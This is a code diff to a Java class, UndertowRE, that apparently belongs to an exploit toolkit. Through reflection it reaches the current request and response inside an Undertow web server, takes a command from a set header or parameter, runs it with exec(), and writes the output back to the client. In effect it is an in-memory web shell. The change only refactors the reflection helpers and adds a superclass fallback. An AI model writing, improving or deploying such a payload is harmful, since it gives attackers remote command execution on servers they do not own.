@@ -38,8 +38,8 @@ public class UndertowRE {
                     Object request = getFieldValue(value, "originalRequest");
                     Object response = getFieldValue(value, "originalResponse");
 
-                    Object header = invokeMethod(request.getClass(), request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
-                    Object param = invokeMethod(request.getClass(), request, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
+                    Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
+                    Object param = invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
                     String str = null;
                     if (header != null) {
                         str = (String) header;
@@ -47,9 +47,9 @@ public class UndertowRE {
                         str = (String) param;
                     }
                     String result = exec(str);
-                    invokeMethod(response.getClass(), response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
-                    Object writer = invokeMethod(response.getClass(), response, "getWriter", new Class[]{}, new Object[]{});
-                    invokeMethod(writer.getClass(), writer, "println", new Class[]{String.class}, new Object[]{result});
+                    invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
+                    Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
+                    invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
 
                     return;
                 }
@@ -95,6 +95,14 @@ public class UndertowRE {
                 field = getField(clazz.getSuperclass(), fieldName);
         }
         return field;
+    }
+
+    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
+        try {
+            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
+        }catch (Exception e){
+            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
+        }
     }
 
     public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
